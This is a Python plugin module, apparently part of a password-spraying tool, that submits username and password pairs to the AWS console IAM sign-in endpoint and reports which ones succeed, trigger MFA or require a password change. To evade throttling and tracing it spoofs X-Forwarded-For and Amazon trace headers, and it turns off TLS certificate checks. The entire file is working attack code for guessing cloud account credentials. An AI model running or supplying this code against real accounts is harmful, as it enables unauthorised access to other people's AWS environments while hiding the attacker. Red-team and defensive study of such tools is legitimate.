import json, requests
import utils.utils as utils
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def aws_authenticate(url, username, password, useragent, pluginargs):

    account = pluginargs["account_id"]

    data_response = {
        'result' : None,    # Can be "success", "failure" or "potential"
        'error': False,
        'output' : "",
        'valid_user' : False
    }

    body = {
        "action": "iam-user-authentication",
        "account": account,
        "username": username,
        "password": password,
        "client_id": "arn:aws:signin:::console/canvas",
        "redirect_uri": "https://console.aws.amazon.com/console/home"
    }

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    headers = {
            "User-Agent": useragent,
            "X-My-X-Forwarded-For": spoofed_ip,
            "x-amzn-apigateway-api-id": amazon_id,
            "X-My-X-Amzn-Trace-Id": trace_id,
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try:
        resp = requests.post(f"{url}/authenticate", data=body, headers=headers, verify=False, proxies=pluginargs["proxy"])
        if resp.status_code == 200:
            resp_json = resp.json()

            if resp_json.get("state") == "SUCCESS":

                if resp_json["properties"]["result"] == "SUCCESS":
                    data_response['result'] = "success"
                    data_response['output'] = f"[+] SUCCESS: => {account}:{username}:{password}"
                    data_response['valid_user'] = True

                elif resp_json["properties"]["result"] == "MFA":
                    data_response['result'] = "potential"
                    data_response['output'] = f"[+] SUCCESS: 2FA => {account}:{username}:{password} - Note: it does not means that the password is correct"
                    data_response['valid_user'] = True

                elif resp_json["properties"]["result"] == "CHANGE_PASSWORD":
                    data_response['result'] = "success"
                    data_response['output'] = f"[+] SUCCESS: Asking for password changing => {account}:{username}:{password}"
                    data_response['valid_user'] = True

                else:
                    result = resp_json["properties"]["result"]
                    data_response['output'] = f"[?] Unknown Response : ({result}) {account}:{username}:{password}"
                    data_response['result'] = "failure"

            elif resp_json.get("state") == "FAIL":
                data_response['output'] = f"[!] FAIL: => {account}:{username}:{password}"
                data_response['result'] = "failure"
            
            else:
                data_response['output'] = f"[?] Unknown Response : {account}:{username}:{password}"
                data_response['result'] = "failure"

        elif resp.status_code == 403:
                data_response['result'] = "failure"
                data_response['output'] = f"[-] FAILURE THROTTLE INDICATED: {resp.status_code} => {account}:{username}:{password}"

        else:
            data_response['result'] = "failure"
            data_response['output'] = f"[-] FAILURE: {resp.status_code} => {account}:{username}:{password}"


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response